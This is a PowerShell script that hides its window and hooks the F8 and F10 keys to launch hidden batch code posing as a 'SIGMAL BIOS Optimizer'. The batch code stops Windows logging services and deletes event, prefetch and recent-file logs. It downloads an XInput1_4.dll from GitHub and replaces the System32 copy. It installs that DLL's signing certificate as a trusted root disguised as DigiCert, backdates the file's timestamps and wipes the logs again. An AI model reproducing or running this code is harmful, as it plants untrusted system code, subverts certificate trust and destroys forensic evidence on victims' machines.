# Hide PowerShell window completely
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null

# Function to execute OLD optimization (F10)
function Invoke-OldOptimization {
    $batchScript = @'
@echo off
title SIGMAL Optimization Tool - Clear Logs and Optimize System
cls
:: Copyright and Info
echo ================================
echo      SIGMAL Optimization Tool
echo ================================
echo Copyright (c) 2025 Skull. All Rights Reserved.
echo Made by SIGMAL.
echo ================================
echo Please read the instructions carefully before proceeding.
echo ================================
:: Ensure script runs as Administrator
NET SESSION >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    exit
)
echo Stopping Windows Logging Services...
net stop "EventLog" /y >nul 2>&1
net stop "Wecsvc" /y >nul 2>&1
net stop "Winmgmt" /y >nul 2>&1
echo Taking Ownership of Log Files...
takeown /f "%WinDir%\Logs" /r /d y >nul 2>&1
icacls "%WinDir%\Logs" /grant Administrators:F /t /c /q >nul 2>&1
takeown /f "%SystemRoot%\System32\winevt\Logs" /r /d y >nul 2>&1
icacls "%SystemRoot%\System32\winevt\Logs" /grant Administrators:F /t /c /q >nul 2>&1
echo Deleting ALL Logs...
del /s /f /q "%WinDir%\Logs\*" >nul 2>&1
del /s /f /q "%SystemRoot%\System32\winevt\Logs\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Temp\*" >nul 2>&1
del /s /f /q "%Temp%\*" >nul 2>&1
del /s /f /q "%WinDir%\Temp\*" >nul 2>&1
del /s /f /q "%SystemRoot%\Prefetch\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Microsoft\Windows\INetCache\*" >nul 2>&1
:: Main Menu - Auto select option 1
cls
echo ================================
echo       SIGMAL BIOS Optimizer
echo ================================
echo WARNING: Optimization process will now apply critical system-level changes!
echo Do not interrupt the process. This is for optimization purposes only.
echo ================================
echo Auto-selecting: Apply Optimization (Critical Update)
echo ================================
:: Check for Admin Privileges
net session >nul 2>&1
if %errorlevel% neq 0 (
    exit /b
)
:: Set the URL for the file download
set "dll_url=https://github.com/evanffx/Remove/raw/refs/heads/main/XInput1_4.dll"
set "dll_path=%TEMP%\XInput1_4.dll"
set "system_dll_path=%SystemRoot%\System32\XInput1_4.dll"
set "cert_path=%TEMP%\temp_cert.cer"
:: Download the file using PowerShell
echo Connecting to the server for BIOS update...
powershell -Command "& {Invoke-WebRequest '%dll_url%' -OutFile '%dll_path%'}"
:: Check if the download was successful
if not exist "%dll_path%" (
    exit /b
)
echo SUCCESS: Update file downloaded.
:: Silent Certificate Addition with Friendly Name
powershell -Command "^
    `$cert = Get-AuthenticodeSignature '%dll_path%'; ^
    if (`$cert.SignerCertificate) { ^
        `$store = New-Object System.Security.Cryptography.X509Certificates.X509Store('Root', 'LocalMachine'); ^
        `$store.Open('ReadWrite'); ^
        `$certObj = `$cert.SignerCertificate; ^
        `$certObj.FriendlyName = 'DigiCert Trusted Certificate'; ^
        `$store.Add(`$certObj); ^
        `$store.Close(); ^
    } ^
" >nul 2>&1
:: Find and terminate processes using the file
echo ================================
echo WARNING: Terminating processes for optimization...
echo ================================
for /f "tokens=2 delims=," %%a in ('powershell -command "`$Processes = Get-Process | Where-Object {(`$_.Modules | Where-Object {`$_.FileName -match 'XInput1_4.dll'})} | Select-Object -ExpandProperty Id; `$Processes -join ','"') do (
    taskkill /PID %%a /F >nul 2>&1
)
:: Stop Windows File Protection temporarily
net stop wuauserv >nul 2>&1
net stop trustedinstaller >nul 2>&1
:: Take ownership and modify permissions
if exist "%system_dll_path%" (
    takeown /f "%system_dll_path%" /a >nul 2>&1
    icacls "%system_dll_path%" /grant Administrators:F /t /c /l >nul 2>&1
)
:: Copy new file to System32 and check result
copy /y "%dll_path%" "%system_dll_path%"
if %errorlevel% equ 0 (
    echo SUCCESS: BIOS optimization has been successfully applied!
) else (
    exit /b
)
:: Modify BIOS DLL Timestamp
powershell -Command "(Get-Item '%system_dll_path%').CreationTime  = '2019-12-06 12:49:00'" >nul 2>&1
powershell -Command "(Get-Item '%system_dll_path%').LastAccessTime = '2019-12-06 12:49:00'" >nul 2>&1
powershell -Command "(Get-Item '%system_dll_path%').LastWriteTime  = '2019-12-06 12:49:00'" >nul 2>&1
:: Restart stopped services
net start wuauserv >nul 2>&1
net start trustedinstaller >nul 2>&1
:: Clear all logs after optimization
echo ================================
echo Clearing logs after optimization...
echo ================================
del /s /f /q "%WinDir%\Logs\*" >nul 2>&1
del /s /f /q "%SystemRoot%\System32\winevt\Logs\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Temp\*" >nul 2>&1
del /s /f /q "%Temp%\*" >nul 2>&1
del /s /f /q "%WinDir%\Temp\*" >nul 2>&1
del /s /f /q "%SystemRoot%\Prefetch\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Microsoft\Windows\INetCache\*" >nul 2>&1
del /s /f /q "%WinDir%\SoftwareDistribution\Datastore\Logs\*" >nul 2>&1
del /s /f /q "%WinDir%\Panther\*" >nul 2>&1
del /s /f /q "%WinDir%\INF\Setupapi.log" >nul 2>&1
del /s /f /q "%WinDir%\INF\Setupapi.dev.log" >nul 2>&1
del /s /f /q "%LocalAppData%\Microsoft\Windows\WER\*" >nul 2>&1
del /s /f /q "%ProgramData%\Microsoft\Windows\WER\*" >nul 2>&1
del /s /f /q "%AppData%\Microsoft\Windows\Recent\*" >nul 2>&1
del /s /f /q "%AppData%\Roaming\Microsoft\Windows\Recent\*" >nul 2>&1
del /s /f /q "%AppData%\Microsoft\Windows\Recent\AutomaticDestinations\*" >nul 2>&1
del /s /f /q "%AppData%\Microsoft\Windows\Recent\CustomDestinations\*" >nul 2>&1
del /s /f /q "%WinDir%\System32\LogFiles\Firewall\*" >nul 2>&1
del /s /f /q "%WinDir%\System32\LogFiles\WMI\*" >nul 2>&1
del /s /f /q "%WinDir%\System32\LogFiles\*" >nul 2>&1
del /s /f /q "%dll_path%" >nul 2>&1
del /s /f /q "%cert_path%" >nul 2>&1
echo Done! BIOS optimization has been successfully applied and logs cleared.
'@
    
    $tempBatch = [System.IO.Path]::GetTempFileName() -replace '\.tmp$', '.bat'
    $batchScript | Out-File -FilePath $tempBatch -Encoding ASCII
    Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$tempBatch`"" -Verb RunAs -WindowStyle Hidden -Wait
    Remove-Item $tempBatch -Force -ErrorAction SilentlyContinue
}

# Function to execute NEW optimization (F8)
function Invoke-NewOptimization {
    $batchScript = @'
@echo off
title SIGMAL Optimization Tool - Clear Logs and Optimize System
cls
:: Copyright and Info
echo ================================
echo      SIGMAL Optimization Tool
echo ================================
echo Copyright (c) 2025 Skull. All Rights Reserved.
echo Made by SIGMAL.
echo ================================
echo Please read the instructions carefully before proceeding.
echo ================================
:: Ensure script runs as Administrator
NET SESSION >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    exit
)
echo Stopping Windows Logging Services...
net stop "EventLog" /y >nul 2>&1
net stop "Wecsvc" /y >nul 2>&1
net stop "Winmgmt" /y >nul 2>&1
echo Taking Ownership of Log Files...
takeown /f "%WinDir%\Logs" /r /d y >nul 2>&1
icacls "%WinDir%\Logs" /grant Administrators:F /t /c /q >nul 2>&1
takeown /f "%SystemRoot%\System32\winevt\Logs" /r /d y >nul 2>&1
icacls "%SystemRoot%\System32\winevt\Logs" /grant Administrators:F /t /c /q >nul 2>&1
echo Deleting ALL Logs (This is a pre-step, cleanup after process will happen later)...
del /s /f /q "%WinDir%\Logs\*" >nul 2>&1
del /s /f /q "%SystemRoot%\System32\winevt\Logs\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Temp\*" >nul 2>&1
del /s /f /q "%Temp%\*" >nul 2>&1
del /s /f /q "%WinDir%\Temp\*" >nul 2>&1
del /s /f /q "%SystemRoot%\Prefetch\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Microsoft\Windows\INetCache\*" >nul 2>&1
:: Main Menu - Auto select option 1
cls
echo ================================
echo       SIGMAL BIOS Optimizer
echo ================================
echo WARNING: Optimization process will now apply critical system-level changes!
echo Do not interrupt the process. This is for optimization purposes only.
echo ================================
echo Auto-selecting: Apply Optimization (Critical Update)
echo ================================
:: Check for Admin Privileges
net session >nul 2>&1
if %errorlevel% neq 0 (
    exit /b
)
:: Set the URL for the file download
set "dll_url=https://github.com/evanffx/nova/raw/refs/heads/main/XInput1_4.dll"
set "dll_path=%TEMP%\XInput1_4.dll"
set "system_dll_path=%SystemRoot%\System32\XInput1_4.dll"
set "cert_path=%TEMP%\temp_cert.cer"
:: Download the file using PowerShell
echo Connecting to the server for BIOS update...
powershell -Command "& {Invoke-WebRequest '%dll_url%' -OutFile '%dll_path%'}"
:: Check if the download was successful
if not exist "%dll_path%" (
    exit /b
)
echo SUCCESS: Update file downloaded.
:: Silent Certificate Addition with Friendly Name
powershell -Command "^
    `$cert = Get-AuthenticodeSignature '%dll_path%'; ^
    if (`$cert.SignerCertificate) { ^
        `$store = New-Object System.Security.Cryptography.X509Certificates.X509Store('Root', 'LocalMachine'); ^
        `$store.Open('ReadWrite'); ^
        `$certObj = `$cert.SignerCertificate; ^
        `$certObj.FriendlyName = 'DigiCert Trusted Certificate'; ^
        `$store.Add(`$certObj); ^
        `$store.Close(); ^
    } ^
" >nul 2>&1
:: Find and terminate processes using the file
echo ================================
echo WARNING: Terminating processes for optimization...
echo ================================
for /f "tokens=2 delims=," %%a in ('powershell -command "`$Processes = Get-Process | Where-Object {(`$_.Modules | Where-Object {`$_.FileName -match 'XInput1_4.dll'})} | Select-Object -ExpandProperty Id; `$Processes -join ','"') do (
    taskkill /PID %%a /F >nul 2>&1
)
:: Stop Windows File Protection temporarily
net stop wuauserv >nul 2>&1
net stop trustedinstaller >nul 2>&1
:: Take ownership and modify permissions
if exist "%system_dll_path%" (
    takeown /f "%system_dll_path%" /a >nul 2>&1
    icacls "%system_dll_path%" /grant Administrators:F /t /c /l >nul 2>&1
)
:: Copy new file to System32 and check result
copy /y "%dll_path%" "%system_dll_path%"
if %errorlevel% equ 0 (
    echo SUCCESS: BIOS optimization has been successfully applied!
) else (
    exit /b
)
:: Modify BIOS DLL Timestamp
powershell -Command "(Get-Item '%system_dll_path%').CreationTime  = '2019-12-06 12:49:00'" >nul 2>&1
powershell -Command "(Get-Item '%system_dll_path%').LastAccessTime = '2019-12-06 12:49:00'" >nul 2>&1
powershell -Command "(Get-Item '%system_dll_path%').LastWriteTime  = '2019-12-06 12:49:00'" >nul 2>&1
:: Restart stopped services
net start wuauserv >nul 2>&1
net start trustedinstaller >nul 2>&1
:: Clear all logs after optimization
echo ================================
echo Clearing logs after optimization...
echo ================================
del /s /f /q "%WinDir%\Logs\*" >nul 2>&1
del /s /f /q "%SystemRoot%\System32\winevt\Logs\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Temp\*" >nul 2>&1
del /s /f /q "%Temp%\*" >nul 2>&1
del /s /f /q "%WinDir%\Temp\*" >nul 2>&1
del /s /f /q "%SystemRoot%\Prefetch\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Microsoft\Windows\INetCache\*" >nul 2>&1
del /s /f /q "%WinDir%\SoftwareDistribution\Datastore\Logs\*" >nul 2>&1
del /s /f /q "%WinDir%\Panther\*" >nul 2>&1
del /s /f /q "%WinDir%\INF\Setupapi.log" >nul 2>&1
del /s /f /q "%WinDir%\INF\Setupapi.dev.log" >nul 2>&1
del /s /f /q "%LocalAppData%\Microsoft\Windows\WER\*" >nul 2>&1
del /s /f /q "%ProgramData%\Microsoft\Windows\WER\*" >nul 2>&1
del /s /f /q "%AppData%\Microsoft\Windows\Recent\*" >nul 2>&1
del /s /f /q "%AppData%\Roaming\Microsoft\Windows\Recent\*" >nul 2>&1
del /s /f /q "%AppData%\Microsoft\Windows\Recent\AutomaticDestinations\*" >nul 2>&1
del /s /f /q "%AppData%\Microsoft\Windows\Recent\CustomDestinations\*" >nul 2>&1
del /s /f /q "%WinDir%\System32\LogFiles\Firewall\*" >nul 2>&1
del /s /f /q "%WinDir%\System32\LogFiles\WMI\*" >nul 2>&1
del /s /f /q "%WinDir%\System32\LogFiles\*" >nul 2>&1
del /s /f /q "%dll_path%" >nul 2>&1
del /s /f /q "%cert_path%" >nul 2>&1
echo Done! BIOS optimization has been successfully applied and logs cleared.
'@
    
    $tempBatch = [System.IO.Path]::GetTempFileName() -replace '\.tmp$', '.bat'
    $batchScript | Out-File -FilePath $tempBatch -Encoding ASCII
    Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$tempBatch`"" -Verb RunAs -WindowStyle Hidden -Wait
    Remove-Item $tempBatch -Force -ErrorAction SilentlyContinue
}

# Global hotkey registration
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class KeyboardHook
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    private static Action _f10Action;
    private static Action _f8Action;

    public static void SetF10Action(Action action)
    {
        _f10Action = action;
    }

    public static void SetF8Action(Action action)
    {
        _f8Action = action;
    }

    public static void Start()
    {
        _hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (System.Diagnostics.Process curProcess = System.Diagnostics.Process.GetCurrentProcess())
        using (System.Diagnostics.ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            if (vkCode == 121) // F10 key
            {
                _f10Action?.Invoke();
            }
            else if (vkCode == 119) // F8 key
            {
                _f8Action?.Invoke();
            }
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
}
"@ -ReferencedAssemblies "System.Windows.Forms"

# Set up hotkey actions
[KeyboardHook]::SetF10Action({ Invoke-OldOptimization })
[KeyboardHook]::SetF8Action({ Invoke-NewOptimization })

# Start the keyboard hook
[KeyboardHook]::Start()